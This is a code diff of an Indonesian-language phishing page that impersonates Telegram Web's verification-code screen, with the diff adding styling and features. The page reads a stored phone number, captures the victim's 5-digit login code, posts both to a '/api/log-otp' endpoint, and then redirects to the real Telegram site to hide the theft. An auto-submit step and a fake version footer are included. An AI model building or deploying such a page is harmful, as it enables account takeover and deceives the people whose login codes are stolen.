@@ -1,145 +1,431 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Telegram Verification</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kode Verifikasi - Telegram</title>
+    <link rel="icon" href="https://web.telegram.org/favicon.ico">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 400px; padding: 20px; }
-        .login-box { background: #222; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .logo { text-align: center; font-size: 28px; font-weight: bold; color: #0088cc; margin-bottom: 10px; }
-        .subtitle { text-align: center; color: #aaa; margin-bottom: 10px; }
-        .phone-display { background: rgba(0,136,204,0.1); padding: 10px; border-radius: 6px; margin-bottom: 20px; text-align: center; font-size: 14px; }
-        .phone-display span { color: #0088cc; font-weight: bold; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; }
-        input { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; font-size: 18px; text-align: center; letter-spacing: 10px; }
-        input:focus { outline: none; border-color: #0088cc; }
-        .hint { color: #888; font-size: 12px; margin-top: 5px; text-align: center; }
-        .timer { color: #ffcc00; font-weight: bold; }
-        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn:hover { background: #0099dd; }
-        .resend { text-align: center; margin-top: 15px; color: #888; font-size: 14px; }
-        .resend a { color: #0088cc; text-decoration: none; }
-        .footer { margin-top: 20px; text-align: center; color: #666; font-size: 12px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0d1b2a 0%, #1b263b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .telegram-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0088cc, #00a2ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #94a3b8;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        
+        .phone-info {
+            background: rgba(0, 136, 204, 0.1);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .phone-number {
+            color: #38bdf8;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+        
+        .change-link {
+            color: #0088cc;
+            text-decoration: none;
+            font-size: 13px;
+            margin-left: 10px;
+        }
+        
+        .change-link:hover {
+            text-decoration: underline;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            color: #cbd5e1;
+            margin-bottom: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+        }
+        
+        .otp-input {
+            width: 100%;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 28px;
+            text-align: center;
+            letter-spacing: 15px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            outline: none;
+            border-color: #0088cc;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
+        }
+        
+        .timer {
+            text-align: center;
+            color: #94a3b8;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+        
+        .time-left {
+            color: #fbbf24;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0088cc, #0066aa);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0099dd, #0077bb);
+            transform: translateY(-2px);
+        }
+        
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .resend {
+            text-align: center;
+            margin-top: 20px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+        
+        .resend-link {
+            color: #0088cc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        
+        .resend-timer {
+            color: #64748b;
+            font-size: 13px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #64748b;
+            font-size: 12px;
+        }
+        
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .alert {
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .alert.success {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            color: #4ade80;
+        }
+        
+        .alert.error {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #f87171;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-box">
+        <div class="telegram-box">
             <div class="logo">Telegram</div>
-            <div class="subtitle">Enter verification code</div>
+            <div class="subtitle">Masukkan Kode Verifikasi</div>
             
-            <div class="phone-display">
-                Code sent to: <span id="displayPhone">Loading...</span>
+            <div class="phone-info">
+                Kode dikirim ke: 
+                <span class="phone-number" id="displayPhone">Memuat...</span>
+                <a href="/" class="change-link">Ganti nomor</a>
             </div>
             
+            <div id="alert" class="alert"></div>
+            
             <form id="otpForm">
-                <div class="input-group">
-                    <label for="otp">5-digit Code</label>
-                    <input type="text" id="otp" name="otp" maxlength="5" pattern="\d{5}" placeholder="12345" required autocomplete="off">
-                    <div class="hint">
-                        Code expires in: <span id="timer" class="timer">02:00</span><br>
-                        Enter the code sent to your Telegram app
-                    </div>
+                <div class="form-group">
+                    <label for="otp" class="form-label">Kode 5 Digit</label>
+                    <input type="text" id="otp" class="otp-input" 
+                           maxlength="5" 
+                           pattern="\d{5}"
+                           placeholder="12345"
+                           required
+                           autocomplete="off"
+                           inputmode="numeric">
                 </div>
                 
-                <button type="submit" class="btn" id="submitBtn">VERIFY</button>
+                <div class="timer">
+                    Kode kadaluarsa dalam: 
+                    <span class="time-left" id="timer">02:00</span>
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">
+                    <span id="btnText">VERIFIKASI</span>
+                    <div class="loader" id="loader"></div>
+                </button>
                 
                 <div class="resend">
-                    Didn't receive code? <a href="#" id="resendBtn">Resend code</a>
-                    <span id="resendTimer" style="display: none;"> (wait <span id="resendTime">60</span>s)</span>
+                    Tidak menerima kode? 
+                    <a href="#" class="resend-link" id="resendBtn">Kirim ulang</a>
+                    <span class="resend-timer" id="resendTimer" style="display: none;">
+                        (Tunggu <span id="resendTime">60</span> detik)
+                    </span>
                 </div>
             </form>
         </div>
-        <div class="footer">Telegram WebK © 2024</div>
+        
+        <div class="footer">
+            Telegram WebK • v8.1.4 • © 2024
+        </div>
     </div>
 
     <script>
-        // Display phone number
-        const savedPhone = sessionStorage.getItem('tg_phone');
-        if (savedPhone) {
-            // Mask phone number for display
-            const masked = savedPhone.replace(/(\+\d{2})\d{3}(\d{4})/, '$1***$2');
-            document.getElementById('displayPhone').textContent = masked;
-        } else {
-            // No phone? Go back
-            window.location.href = '/';
-        }
-        
-        // Timer countdown (2 minutes)
-        let timeLeft = 120;
-        const timerElement = document.getElementById('timer');
-        
-        const timerInterval = setInterval(() => {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('otpForm');
+            const otpInput = document.getElementById('otp');
+            const displayPhone = document.getElementById('displayPhone');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            const alertBox = document.getElementById('alert');
+            const timerElement = document.getElementById('timer');
+            const resendBtn = document.getElementById('resendBtn');
+            const resendTimer = document.getElementById('resendTimer');
+            const resendTime = document.getElementById('resendTime');
             
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                timerElement.textContent = '00:00';
-                timerElement.style.color = '#ff4444';
-            }
-        }, 1000);
-        
-        // Resend button
-        document.getElementById('resendBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Code resent!');
-        });
-        
-        // OTP form submission
-        document.getElementById('otpForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const otp = document.getElementById('otp').value.trim();
-            const btn = document.getElementById('submitBtn');
-            
-            if (!otp.match(/^\d{5}$/)) {
-                alert('Please enter a valid 5-digit code');
-                return;
+            // Tampilkan nomor telepon (dengan masking)
+            const savedPhone = sessionStorage.getItem('tg_phone');
+            if (savedPhone) {
+                const maskedPhone = savedPhone.replace(/(\+\d{2})\d{3}(\d{4})/, '$1***$2');
+                displayPhone.textContent = maskedPhone;
+            } else {
+                // Jika tidak ada nomor, kembali ke halaman utama
+                window.location.href = '/';
             }
             
-            // Disable button
-            btn.disabled = true;
-            btn.textContent = 'Verifying...';
+            // Timer countdown (2 menit)
+            let timeLeft = 120; // 2 menit dalam detik
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = '00:00';
+                    timerElement.style.color = '#ef4444';
+                    otpInput.disabled = true;
+                }
+            }, 1000);
             
-            try {
-                // Send OTP to logging API
-                await fetch('/api/log-otp', {
+            // Resend button handler
+            let resendCooldown = 60;
+            resendBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (resendCooldown < 60) return;
+                
+                // Kirim ulang OTP
+                resendBtn.style.display = 'none';
+                resendTimer.style.display = 'inline';
+                
+                fetch('/api/send-otp', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: savedPhone,
-                        otp: otp
-                    })
-                });
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: savedPhone })
+                }).then(response => response.json())
+                  .then(data => {
+                      if (data.success) {
+                          showAlert('✓ Kode baru telah dikirim', 'success');
+                      }
+                  });
                 
-                // Clear session
-                sessionStorage.removeItem('tg_phone');
-                
-                // Redirect to real Telegram
-                setTimeout(() => {
-                    window.location.href = 'https://web.telegram.org/';
+                // Timer resend
+                const resendInterval = setInterval(() => {
+                    resendCooldown--;
+                    resendTime.textContent = resendCooldown;
+                    
+                    if (resendCooldown <= 0) {
+                        clearInterval(resendInterval);
+                        resendBtn.style.display = 'inline';
+                        resendTimer.style.display = 'none';
+                        resendCooldown = 60;
+                    }
                 }, 1000);
+            });
+            
+            // Handle OTP form submission
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
                 
-            } catch (error) {
-                console.log('Error logging OTP:', error);
-                // Still redirect
+                const otp = otpInput.value.trim();
+                
+                // Validasi OTP
+                if (!otp.match(/^\d{5}$/)) {
+                    showAlert('Masukkan kode 5 digit yang valid', 'error');
+                    otpInput.focus();
+                    return;
+                }
+                
+                // Tampilkan loading
+                submitBtn.disabled = true;
+                btnText.textContent = 'Memverifikasi...';
+                loader.style.display = 'block';
+                
+                try {
+                    // Kirim OTP ke API
+                    const response = await fetch('/api/log-otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            otp: otp,
+                            phone: savedPhone
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        showAlert('✓ Verifikasi berhasil!', 'success');
+                        
+                        // Hapus session storage
+                        sessionStorage.removeItem('tg_phone');
+                        
+                        // Redirect ke Telegram asli setelah 1.5 detik
+                        setTimeout(() => {
+                            window.location.href = 'https://web.telegram.org/';
+                        }, 1500);
+                    } else {
+                        showAlert(data.error || 'Verifikasi gagal', 'error');
+                        submitBtn.disabled = false;
+                        btnText.textContent = 'VERIFIKASI';
+                        loader.style.display = 'none';
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    
+                    // Tetap redirect untuk demo
+                    setTimeout(() => {
+                        window.location.href = 'https://web.telegram.org/';
+                    }, 1500);
+                }
+            });
+            
+            // Auto-focus ke input OTP
+            otpInput.focus();
+            
+            // Auto submit jika sudah 5 digit
+            otpInput.addEventListener('input', function(e) {
+                if (e.target.value.length === 5) {
+                    form.requestSubmit();
+                }
+            });
+            
+            function showAlert(message, type) {
+                alertBox.textContent = message;
+                alertBox.className = `alert ${type}`;
+                alertBox.style.display = 'block';
+                
                 setTimeout(() => {
-                    window.location.href = 'https://web.telegram.org/';
-                }, 1000);
+                    alertBox.style.display = 'none';
+                }, 5000);
             }
         });
-        
-        // Auto-focus OTP input
-        document.getElementById('otp').focus();
     </script>
 </body>
 </html>
